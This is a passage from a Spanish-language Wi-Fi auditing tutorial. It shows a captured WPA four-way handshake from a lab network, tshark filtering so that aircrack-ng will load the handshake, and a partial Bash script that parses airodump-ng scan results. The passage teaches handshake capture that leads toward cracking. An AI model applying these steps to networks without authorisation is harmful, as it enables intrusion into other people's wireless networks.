    3   0.374849 XiaomiCo_b1:c5:53 → HonHaiPr_17:91:c0 802.11 210 Probe Response, &lt;span class=&quot;nv&quot;&gt;SN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;2287, &lt;span class=&quot;nv&quot;&gt;FN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0, &lt;span class=&quot;nv&quot;&gt;Flags&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;........, &lt;span class=&quot;nv&quot;&gt;BI&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;100, &lt;span class=&quot;nv&quot;&gt;SSID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;hacklab
    5   0.586817 XiaomiCo_b1:c5:53 → HonHaiPr_17:91:c0 802.11 210 Probe Response, &lt;span class=&quot;nv&quot;&gt;SN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;2288, &lt;span class=&quot;nv&quot;&gt;FN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0, &lt;span class=&quot;nv&quot;&gt;Flags&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;........, &lt;span class=&quot;nv&quot;&gt;BI&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;100, &lt;span class=&quot;nv&quot;&gt;SSID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;hacklab
    6   0.590400 XiaomiCo_b1:c5:53 → HonHaiPr_17:91:c0 802.11 210 Probe Response, &lt;span class=&quot;nv&quot;&gt;SN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;2288, &lt;span class=&quot;nv&quot;&gt;FN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0, &lt;span class=&quot;nv&quot;&gt;Flags&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;........, &lt;span class=&quot;nv&quot;&gt;BI&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;100, &lt;span class=&quot;nv&quot;&gt;SSID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;hacklab
    7   0.594497 XiaomiCo_b1:c5:53 → HonHaiPr_17:91:c0 802.11 210 Probe Response, &lt;span class=&quot;nv&quot;&gt;SN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;2288, &lt;span class=&quot;nv&quot;&gt;FN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0, &lt;span class=&quot;nv&quot;&gt;Flags&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;........, &lt;span class=&quot;nv&quot;&gt;BI&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;100, &lt;span class=&quot;nv&quot;&gt;SSID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;hacklab
    8   0.596543 XiaomiCo_b1:c5:53 → HonHaiPr_17:91:c0 802.11 210 Probe Response, &lt;span class=&quot;nv&quot;&gt;SN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;2288, &lt;span class=&quot;nv&quot;&gt;FN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0, &lt;span class=&quot;nv&quot;&gt;Flags&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;....R..., &lt;span class=&quot;nv&quot;&gt;BI&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;100, &lt;span class=&quot;nv&quot;&gt;SSID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;hacklab
    9   0.600640 XiaomiCo_b1:c5:53 → HonHaiPr_17:91:c0 802.11 210 Probe Response, &lt;span class=&quot;nv&quot;&gt;SN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;2288, &lt;span class=&quot;nv&quot;&gt;FN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0, &lt;span class=&quot;nv&quot;&gt;Flags&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;........, &lt;span class=&quot;nv&quot;&gt;BI&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;100, &lt;span class=&quot;nv&quot;&gt;SSID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;hacklab
   10   0.602688 XiaomiCo_b1:c5:53 → HonHaiPr_17:91:c0 802.11 210 Probe Response, &lt;span class=&quot;nv&quot;&gt;SN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;2288, &lt;span class=&quot;nv&quot;&gt;FN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0, &lt;span class=&quot;nv&quot;&gt;Flags&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;....R..., &lt;span class=&quot;nv&quot;&gt;BI&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;100, &lt;span class=&quot;nv&quot;&gt;SSID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;hacklab
   11   0.605759 XiaomiCo_b1:c5:53 → HonHaiPr_17:91:c0 802.11 210 Probe Response, &lt;span class=&quot;nv&quot;&gt;SN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;2288, &lt;span class=&quot;nv&quot;&gt;FN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0, &lt;span class=&quot;nv&quot;&gt;Flags&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;....R..., &lt;span class=&quot;nv&quot;&gt;BI&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;100, &lt;span class=&quot;nv&quot;&gt;SSID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;hacklab
   12   0.610367 XiaomiCo_b1:c5:53 → HonHaiPr_17:91:c0 802.11 210 Probe Response, &lt;span class=&quot;nv&quot;&gt;SN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;2288, &lt;span class=&quot;nv&quot;&gt;FN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0, &lt;span class=&quot;nv&quot;&gt;Flags&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;........, &lt;span class=&quot;nv&quot;&gt;BI&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;100, &lt;span class=&quot;nv&quot;&gt;SSID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;hacklab
   13   4.188928 XiaomiCo_b1:c5:53 → IntelCor_46:d1:38 802.11 229 Probe Response, &lt;span class=&quot;nv&quot;&gt;SN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1935, &lt;span class=&quot;nv&quot;&gt;FN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0, &lt;span class=&quot;nv&quot;&gt;Flags&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;........, &lt;span class=&quot;nv&quot;&gt;BI&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;100, &lt;span class=&quot;nv&quot;&gt;SSID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;hacklab
   34   7.903744 XiaomiCo_b1:c5:53 → IntelCor_46:d1:38 EAPOL 133 Key &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Message 1 of 4&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
   36   7.907316 IntelCor_46:d1:38 → XiaomiCo_b1:c5:53 EAPOL 155 Key &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Message 2 of 4&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
   40   7.912448 XiaomiCo_b1:c5:53 → IntelCor_46:d1:38 EAPOL 189 Key &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Message 3 of 4&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
   42   7.914483 IntelCor_46:d1:38 → XiaomiCo_b1:c5:53 EAPOL 133 Key &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Message 4 of 4&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
  112   8.252481 XiaomiCo_b1:c5:53 → HonHaiPr_17:91:c0 802.11 210 Probe Response, &lt;span class=&quot;nv&quot;&gt;SN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;2292, &lt;span class=&quot;nv&quot;&gt;FN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0, &lt;span class=&quot;nv&quot;&gt;Flags&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;........, &lt;span class=&quot;nv&quot;&gt;BI&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;100, &lt;span class=&quot;nv&quot;&gt;SSID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;hacklab
  113   8.259649 XiaomiCo_b1:c5:53 → HonHaiPr_17:91:c0 802.11 210 Probe Response, &lt;span class=&quot;nv&quot;&gt;SN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;2292, &lt;span class=&quot;nv&quot;&gt;FN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0, &lt;span class=&quot;nv&quot;&gt;Flags&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;........, &lt;span class=&quot;nv&quot;&gt;BI&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;100, &lt;span class=&quot;nv&quot;&gt;SSID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;hacklab
  114   8.261696 XiaomiCo_b1:c5:53 → HonHaiPr_17:91:c0 802.11 210 Probe Response, &lt;span class=&quot;nv&quot;&gt;SN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;2292, &lt;span class=&quot;nv&quot;&gt;FN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0, &lt;span class=&quot;nv&quot;&gt;Flags&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;....R..., &lt;span class=&quot;nv&quot;&gt;BI&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;100, &lt;span class=&quot;nv&quot;&gt;SSID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;hacklab
  115   8.272449 XiaomiCo_b1:c5:53 → HonHaiPr_17:91:c0 802.11 210 Probe Response, &lt;span class=&quot;nv&quot;&gt;SN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;2292, &lt;span class=&quot;nv&quot;&gt;FN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0, &lt;span class=&quot;nv&quot;&gt;Flags&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;........, &lt;span class=&quot;nv&quot;&gt;BI&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;100, &lt;span class=&quot;nv&quot;&gt;SSID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;hacklab
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Por último y para que no os asustéis, fijaros qué curioso:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ &lt;span class=&quot;c&quot;&gt;#tshark -r Captura-02.cap -Y &quot;(wlan.fc.type_subtype==0x08 || wlan.fc.type_subtype==0x05 || eapol) &amp;amp;&amp;amp; wlan.addr==20:34:fb:b1:c5:53&quot; -w filteredCapture 2&amp;gt;/dev/null&lt;/span&gt;
┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ &lt;span class=&quot;c&quot;&gt;#aircrack-ng filteredCapture &lt;/span&gt;
Opening filteredCapture wait...
Unsupported file format &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;not a pcap or IVs file&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Read 0 packets.

No networks found, exiting.


Quitting aircrack-ng...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;La suite de &lt;strong&gt;aircrack-ng&lt;/strong&gt;, debería ser capaz de distinguirnos el punto de acceso y el Handshake capturado,
hemos visto que &lt;strong&gt;Pyrit&lt;/strong&gt; lo detecta sin problemas, ¿por qué aircrack no?, la respuesta es sencilla. A la hora
de exportar la captura desde &lt;strong&gt;tshark&lt;/strong&gt;, si queremos que &lt;strong&gt;aircrack&lt;/strong&gt; nos lo interprete, debemos de
especificar en el modo de exportación para la captura el formato &lt;strong&gt;pcap&lt;/strong&gt;, de la siguiente forma:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ &lt;span class=&quot;c&quot;&gt;#tshark -r Captura-02.cap -R &quot;(wlan.fc.type_subtype==0x08 || wlan.fc.type_subtype==0x05 || eapol) &amp;amp;&amp;amp; wlan.addr==20:34:fb:b1:c5:53&quot; -2 -w filteredCapture -F pcap 2&amp;gt;/dev/null&lt;/span&gt;
┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ &lt;span class=&quot;c&quot;&gt;#aircrack-ng filteredCapture &lt;/span&gt;
Opening filteredCapture wait...
Read 19 packets.

   &lt;span class=&quot;c&quot;&gt;#  BSSID              ESSID                     Encryption&lt;/span&gt;

   1  20:34:FB:B1:C5:53  hacklab                   WPA &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 handshake&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;

Choosing first network as target.

Opening filteredCapture wait...
Read 19 packets.

1 potential targets
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Destacar que he hecho uso del parámetro ‘&lt;strong&gt;-R&lt;/strong&gt;’ en vez del ‘&lt;strong&gt;-Y&lt;/strong&gt;’ porque estoy haciendo uso del parámetro
‘&lt;strong&gt;-2&lt;/strong&gt;’, con el objetivo de hacer un doble pase durante la fase de análisis. Esta opción es incluso mejor,
dado que se recopilan las anotaciones. El uso del parámetro ‘&lt;strong&gt;-R&lt;/strong&gt;’ requiere de forma obligatoria que
añadamos el parámetro ‘&lt;strong&gt;-2&lt;/strong&gt;’.&lt;/p&gt;

&lt;p&gt;Os dejo por aquí una pequeña aclaratoria de la utilidad de estos parámetros: &lt;a href=&quot;https://osqa-ask.wireshark.org/questions/19794/what-is-the-meaning-of-two-pass-analysis&quot;&gt;Interés&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&quot;parseador-para-redes-del-entorno&quot;&gt;Parseador para redes del entorno&lt;/h3&gt;

&lt;p&gt;Hasta ahora hemos estado parseando redes específicas, pero, ¿no te has parado a pensar en que también
podríamos hacer esto?:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;airodump-ng wlan0mon -w Captura&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Es decir, capturar todo el tráfico de todas las redes disponibles en el entorno en un fichero. ¿Por qué íbamos
a querer hacer esto?, bueno, desde &lt;strong&gt;airodump-ng&lt;/strong&gt;, en el momento de escanear las redes del entorno, lo vemos
todo claro, bien representado, sin embargo, una vez las evidencias son exportadas al fichero especificado, ya
la manera de representar los datos no son los mismos.&lt;/p&gt;

&lt;p&gt;Por ello, os comparto el siguiente script en Bash:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/bin/bash&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[[&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$1&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$1&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;]]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;then
    &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;FILE&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$1&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;else
    &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'\nEspecifica el fichero .csv a analizar\n'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'Uso:'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;./parser.sh Captura-01.csv&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;nb&quot;&gt;exit  
&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;fi

&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;test&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; oui.txt 2&amp;gt;/dev/null

&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$?&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;0&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;then
  
    &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;33[1mNúmero total de puntos de acceso: &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;33[0;31m&lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-E&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'([A-Za-z0-9._: @\(\)\\=\[\{\}\&quot;%;-]+,){14}'&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$FILE&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;wc&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\e&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;[0m&quot;&lt;/span&gt;
    &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;33[1mNúmero total de estaciones: &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;33[0;31m&lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-E&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'([A-Za-z0-9._: @\(\)\\=\[\{\}\&quot;%;-]+,){5} ([A-Z0-9:]{17})|(not associated)'&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$FILE&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;wc&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\e&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;[0m&quot;&lt;/span&gt;
    &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;33[1mNúmero total de estaciones no asociadas: &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;33[0;31m&lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-E&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'(not associated)'&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$FILE&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;wc&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\e&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;[0m&quot;&lt;/span&gt;
    
    &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;33[0;36m&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;33[1mPuntos de acceso disponibles:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\e&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;[0m&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
    
    &lt;span class=&quot;k&quot;&gt;while &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;read&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt; line &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do
    
        if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$line&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;cut&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;','&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; 14&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot; &quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;then
            &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;33[1m&quot;&lt;/span&gt; &lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$line&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;cut&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;','&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; 14&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\e&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;[0m&quot;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;else
            &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot; &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\e&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;[3mNo es posible obtener el nombre de la red (ESSID)&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\e&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;[0m&quot;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;fi
    
        &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;fullMAC&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$line&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;cut&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;','&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; 1&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;
        &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;Dirección MAC: &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$fullMAC&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
    
